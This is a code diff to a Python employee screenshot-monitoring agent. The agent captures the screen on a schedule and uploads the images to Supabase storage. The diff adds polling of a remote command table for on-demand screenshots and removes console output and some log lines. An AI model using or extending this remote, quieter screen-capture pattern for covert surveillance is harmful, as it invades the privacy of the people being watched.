@@ -5,13 +5,11 @@ import mss
 import mss.tools
 from supabase import Client
 
-# Log helper
 log_file = os.path.join(os.getenv('APPDATA'), 'AlaskaCache', 'agent.log')
 def log(msg):
     try:
         with open(log_file, "a", encoding="utf-8") as f:
             f.write(f"[Screenshot] {msg}\n")
-        print(f"[Screenshot] {msg}")
     except:
         pass
 
@@ -32,11 +30,13 @@ class ScreenshotService:
         
         while True:
             await self.check_config()
+            await self.poll_commands()
+            
             if self.enabled:
                 await self.capture()
                 await asyncio.sleep(self.current_interval)
             else:
-                await asyncio.sleep(10)
+                await asyncio.sleep(5)
 
     async def check_config(self):
         try:
@@ -45,9 +45,24 @@ class ScreenshotService:
                 settings = response.data["settings"]
                 self.current_interval = settings.get("screenshot_interval", self.default_interval)
                 self.enabled = settings.get("screenshots_enabled", False)
-                log(f"Config: enabled={self.enabled}, interval={self.current_interval}")
         except Exception as e:
-            log(f"Config fetch error: {e}")
+            log(f"Config error: {e}")
+
+    async def poll_commands(self):
+        try:
+            response = self.supabase.table("commands")\
+                .select("*")\
+                .eq("employee_id", self.employee_id)\
+                .eq("command_type", "TAKE_SCREENSHOT")\
+                .eq("status", "PENDING")\
+                .execute()
+            
+            for cmd in response.data:
+                log(f"On-demand screenshot requested.")
+                await self.capture()
+                self.supabase.table("commands").update({"status": "EXECUTED"}).eq("id", cmd["id"]).execute()
+        except Exception as e:
+            log(f"Poll error: {e}")
 
     async def capture(self):
         filename = f"screenshot_{int(time.time())}.png"
@@ -67,7 +82,7 @@ class ScreenshotService:
                 log(f"Uploaded: {filename}")
                 self.delete_file(cache_path)
             else:
-                log(f"Offline. Cached: {filename}")
+                log(f"Cached: {filename}")
 
         except Exception as e:
             log(f"Capture error: {e}")
@@ -76,16 +91,10 @@ class ScreenshotService:
         try:
             with open(file_path, 'rb') as f:
                 storage_path = f"{self.employee_id}/{filename}"
-                
-                # Upload to Storage
-                res = self.supabase.storage.from_("screenshots").upload(
-                    file=f, 
-                    path=storage_path, 
-                    file_options={"content-type": "image/png", "upsert": "true"}
+                self.supabase.storage.from_("screenshots").upload(
+                    file=f, path=storage_path, file_options={"content-type": "image/png", "upsert": "true"}
                 )
-                log(f"Storage response: {res}")
                 
-            # Insert DB record
             self.supabase.table("screenshots").insert({
                 "employee_id": self.employee_id, 
                 "storage_path": storage_path, 
@@ -109,10 +118,7 @@ class ScreenshotService:
 
     def prune_cache(self):
         try:
-            files = sorted(
-                [os.path.join(self.cache_dir, f) for f in os.listdir(self.cache_dir) if f.endswith('.png')],
-                key=os.path.getctime
-            )
+            files = sorted([os.path.join(self.cache_dir, f) for f in os.listdir(self.cache_dir) if f.endswith('.png')], key=os.path.getctime)
             if len(files) > self.max_cache_files:
                 for f in files[:len(files) - self.max_cache_files]:
                     self.delete_file(f)
